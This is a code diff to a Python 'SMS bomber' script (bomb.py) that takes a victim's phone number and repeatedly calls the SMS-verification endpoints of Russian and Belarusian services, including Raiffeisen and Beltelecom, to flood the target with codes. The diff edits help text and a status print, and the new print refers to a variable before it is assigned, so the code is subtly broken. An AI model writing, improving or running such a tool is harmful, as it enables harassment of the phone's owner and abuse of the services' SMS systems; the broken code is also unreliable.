@@ -11,7 +11,7 @@ class spymer:
 ║╚═╝║║║─║║║║	
 ╚═══╝╚╝─╚╝╚╝	''')
 		parser = argparse.ArgumentParser(prog='bomb.py')
-		parser.add_argument('phonenum', metavar='phone')
+		parser.add_argument('phonenum', metavar='bomb.py phone (+79000000000)')
 		args = parser.parse_args()
 		def showstatus(message, type='new'):
 			now = datetime.datetime.now().strftime('%H:%M:%S')
@@ -52,6 +52,7 @@ class spymer:
 		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
 		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
 		print(showstatus(wrapsbrace('info', True) + ('Телефон: +{}').format(_phone)))
+		print(showstatus(wrapsbrace('info', True) + ('Отправленно: +{}').format(iteration) + ' | Время: {}'.format(message)))
 		i = 1
 		iteration = 0
 		while i < 10:
@@ -107,7 +108,6 @@ class spymer:
 			raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
 			beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
 			iteration += 1
-			print('Отправленно: ' + interation + ' | Время: ' + message)
 
 spammer = spymer()
 spammer.main()
